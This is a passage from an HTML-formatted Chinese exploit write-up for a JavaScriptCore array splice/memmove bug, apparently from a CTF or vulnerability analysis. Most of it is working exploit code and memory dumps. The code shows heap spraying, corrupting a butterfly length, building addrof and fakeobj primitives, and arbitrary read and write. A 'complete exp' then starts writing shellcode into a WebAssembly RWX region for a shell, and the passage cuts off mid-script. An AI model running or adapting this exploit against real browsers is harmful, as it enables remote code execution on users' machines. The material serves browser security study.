class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288018: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// vector + 0x1000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288a78: 0x0000000000000000 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000d0000000a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288a88: 0x0000000000001337 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span></p><p class="cs40DD2BC9"><span class="cs8926E06">memmove</span><span class="cs9C1B1871">之后</span><span class="cs8926E06">, </span><span class="cs9C1B1871">可以把其他</span><span class="cs8926E06">object </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">buttefly</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> length </span><span class="cs9C1B1871">改了，假如可以找到这个</span><span class="cs8926E06"> object</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">那么就可以利用这个</span><span class="cs8926E06"> object </span><span class="cs9C1B1871">来构造越界读写了。</span></p><p class="cs3A447A38"><span class="cs9FB05234">// vector</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287a78: 0x0000000000000000 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000badbeef0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287a88: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000badbeef0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// </span><span class="cs7FFD2630">其他</span><span class="cs9FB05234"> object </span><span class="cs7FFD2630">的</span><span class="cs9FB05234"> butterfly, &nbsp;length = 0x1337</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287ff8: 0x0000000d0000000a &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000000001337</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288008: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// vector + 0x1000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288a78: 0x0000000d0000000a &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000000001337</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288a88: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span></p><h4 class="cs868C439D">
			<a name="addrof-和-fakeobj-构造"><span class="csBF12A472">addrof </span><span class="cs6EDCDAE2">和</span><span class="csBF12A472"> fakeobj </span><span class="cs6EDCDAE2">构造</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先喷一堆的</span><span class="cs8926E06">object</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">尝试构造出上面提到的内存布局，</span><span class="cs8926E06">length</span><span class="cs9C1B1871">都是</span><span class="cs8926E06"> 10</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这样新分配的内存就是</span><span class="cs8926E06"> </span><span class="cs9FB05234">10 * 8 + 0x10 = 0x60</span><span class="cs8926E06">, </span><span class="cs9C1B1871">就会和新申请的</span><span class="cs9FB05234">storage</span><span class="cs8926E06"> </span><span class="cs9C1B1871">分配在十分接近的内存上。</span><span class="cs8926E06"> </span><span class="cs9FB05234">spray[i]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs9FB05234">spray[i+1]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">会连续分配</span></p><p class="cs3A447A38"><span class="cs9FB05234">for (let i = 0; i &lt; 0x3000; i += 2) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i] &nbsp;&nbsp;= [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i]; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i+1] = [{},{},{},{},{},{},{},{},{},{}]; &nbsp;// fakeobj &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for (let i = 0; i &lt; 0x3000; i += 2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i][0] = i2f(0x1337)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后是</span><span class="cs8926E06"> splice(0x1000,0,1) </span><span class="cs9C1B1871">触发</span><span class="cs9FB05234">memmove</span><span class="cs8926E06">, </span><span class="cs9C1B1871">然后找出那个被改了</span><span class="cs8926E06"> size </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> object</span></p><p class="cs3A447A38"><span class="cs9FB05234">arr.splice(0x1000,0,1); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">fake_index=-1; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for(let i=0;i&lt;0x3000;i+=2){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(spray[i].length!=10){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;hit: &quot;+i.toString(16)); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_index=i; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//..spray[i] ArrayWithDouble</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000287ff8: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000d0000000a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288008: 0x0000000000001337 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288018: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288028: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288038: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288048: 0x402abd70a3d70a3d &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x40c77caf5c28f5c3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// spray[i+1], ArrayWithContiguous</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288058: 0x7ff8000000000000 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x7ff8000000000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288068: 0x7ff8000000000000 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000d0000000a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288078: 0x00007fffae25d240 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00007fffae25d280</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288088: 0x00007fffae25d2c0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00007fffae25d300</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff000288098: 0x00007fffae25d340 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00007fffae25d380</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff0002880a8: 0x00007fffae25d3c0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00007fffae25d400</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7ff0002880b8: 0x00007fffae25d440 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00007fffae25d480</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">到了这里</span><span class="cs8926E06">, </span><span class="cs9FB05234">spray[i][14] == spray[i+1][0]</span><span class="cs8926E06">, </span><span class="cs9C1B1871">往</span><span class="cs9FB05234">spray[i][14]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">写一个</span><span class="cs8926E06"> </span><span class="cs9C1B1871">地址，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后从</span><span class="cs9FB05234">spray[i+1]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">取出来就会认为他是一个</span><span class="cs8926E06">object, </span><span class="cs9C1B1871">同样可以用</span><span class="cs9FB05234">spray[i][14]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">读</span><span class="cs8926E06"> object </span><span class="cs9C1B1871">的地址，</span><span class="cs8926E06"> fakeobj </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> addrof </span><span class="cs9C1B1871">的构造就十分直接啦</span></p><p class="cs3A447A38"><span class="cs9FB05234">unboxed = spray[fake_index]; &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">boxed = spray[fake_index+1]; &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(unboxed)) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(boxed)) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function addrof(obj){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;boxed[0] = obj; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return f2i(unboxed[14]); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function fakeobj(addr){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unboxed[14] = i2f(addr); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return boxed[0]; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="任意地址读写--写-wasm-getshell"><span class="cs6EDCDAE2">任意地址读写</span><span class="csBF12A472"> &amp; </span><span class="cs6EDCDAE2">写</span><span class="csBF12A472"> wasm getshell</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">接下来的利用基本上就都是通用套路了，改</span><span class="cs8926E06"> </span><span class="cs9FB05234">ArrayWithDouble</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> butterfly </span><span class="cs9C1B1871">任意地址读写，然后找</span><span class="cs8926E06"> wasm </span><span class="cs9C1B1871">的</span><span class="cs9FB05234">rwx</span><span class="cs8926E06"> </span><span class="cs9C1B1871">段写</span><span class="cs8926E06">shellcode, </span><span class="cs9C1B1871">执行</span><span class="cs8926E06">shellcode </span><span class="cs9C1B1871">完事。</span></p><h3 class="cs868C439D">
			<a name="exp"><span class="csD1E291E2">exp</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">完整</span><span class="cs8926E06">exp </span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">var conversion_buffer = new ArrayBuffer(8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var f64 = new Float64Array(conversion_buffer)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var i32 = new Uint32Array(conversion_buffer)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var BASE32 = 0x100000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function f2i(f) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;f64[0] = f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return i32[0] + BASE32 * i32[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function i2f(i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;i32[0] = i % BASE32</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;i32[1] = i / BASE32</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return f64[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function user_gc() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for (let i = 0; i &lt; 10; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;let ab = new ArrayBuffer(1024 * 1024 * 10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">let arr = [1];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">arr.length = 0x100000;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">arr.splice(0, 0x11);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">arr.length = 0xfffffff0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">let spray = new Array(0x3000);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">for (let i = 0; i &lt; 0x3000; i += 2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i] &nbsp;&nbsp;= [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i+1] = [{},{},{},{},{},{},{},{},{},{}];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for (let i = 0; i &lt; 0x3000; i += 2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;spray[i][0] = i2f(0x1337)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">arr.splice(0x1000,0,1);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">fake_index=-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for(let i=0;i&lt;0x3000;i+=2){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(spray[i].length!=10){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;hit: &quot;+i.toString(16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_index=i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">unboxed = spray[fake_index];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">boxed = spray[fake_index+1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(unboxed))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(boxed))</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">function addrof(obj){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;boxed[0] = obj;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return f2i(unboxed[14]);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function fakeobj(addr){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unboxed[14] = i2f(addr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return boxed[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">victim = [1.1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">victim[0] =3.3;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">victim[&#39;prop&#39;] = 13.37;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">victim[&#39;prop&#39;+1] = 13.37;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(victim))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(addrof(victim).toString(16))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">i32[0]=100;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">i32[1]=0x01082107 - 0x10000;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var container={</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;jscell:f64[0],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;butterfly:victim,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(describe(container))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">container_addr = addrof(container);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">hax = fakeobj(container_addr+0x10);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var unboxed2 = [1.1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">unboxed2[0] =3.3;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var boxed2 = [{}]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">hax[1] = i2f(addrof(unboxed2))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var shared = victim[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">hax[1] = i2f(addrof(boxed2))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">victim[1] = shared;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">var stage2={</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;addrof: function(obj){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boxed2[0] = obj;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return f2i(unboxed2[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fakeobj: function(addr){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unboxed2[0] = i2f(addr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return boxed2[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;read64: function(addr){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hax[1] = i2f(addr + 0x10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return this.addrof(victim.prop);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write64: function(addr,data){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hax[1] = i2f(addr+0x10);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;victim.prop = this.fakeobj(data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write: function(addr, shellcode) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var theAddr = addr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(var i=0;i&lt;shellcode.length;i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.write64(addr+i,shellcode[i].charCodeAt())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pwn: function(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var wasm_mod = new WebAssembly.Module(wasm_code);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 